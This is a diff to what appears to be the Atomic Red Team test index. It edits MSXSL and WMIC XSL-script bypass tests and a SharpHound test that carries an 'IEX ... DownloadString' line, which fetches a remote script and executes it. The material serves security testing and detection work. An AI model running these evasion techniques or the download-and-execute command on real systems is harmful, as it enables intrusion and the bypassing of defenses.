@@ -12917,7 +12917,8 @@ defense-evasion:
     - name: MSXSL Bypass using local files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -12951,7 +12952,8 @@ defense-evasion:
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -12995,12 +12997,13 @@ defense-evasion:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
 '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
-        payload.
+        payload. Open Calculator.exe when test sucessfully executed, while AV turned
+        off.
 
 '
       supported_platforms:
@@ -13016,7 +13019,7 @@ defense-evasion:
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 
 '
 privilege-escalation:
@@ -23065,10 +23068,13 @@ execution:
           type: url
           default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
-          Invoke-BloodHound"
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
+          Invoke-BloodHound
+
+'
+        cleanup_command: 'Remove-Item $env:temp\*BloodHound.zip -Force
 
 '
     - name: Obfuscation Tests
@@ -25536,7 +25542,8 @@ execution:
     - name: MSXSL Bypass using local files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -25570,7 +25577,8 @@ execution:
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -25614,12 +25622,13 @@ execution:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
 '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
-        payload.
+        payload. Open Calculator.exe when test sucessfully executed, while AV turned
+        off.
 
 '
       supported_platforms:
@@ -25635,7 +25644,7 @@ execution:
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 
 '
 lateral-movement:
